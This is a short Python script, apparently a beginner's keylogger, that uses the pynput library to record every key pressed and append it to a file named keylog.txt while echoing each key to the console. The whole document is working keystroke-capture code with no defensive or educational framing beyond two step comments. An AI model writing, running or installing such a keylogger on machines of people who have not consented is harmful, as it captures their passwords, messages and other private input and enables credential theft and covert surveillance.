# step 1: catch the characters that were pressed
# step 2: log them in a file

from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, 'a') as file:
        try:
            file.write(key.char)
            print(key.char)
        except AttributeError:
            file.write(str(key))
            print(key)

with keyboard.Listener(
        on_press=on_press,) as listener:
    listener.join()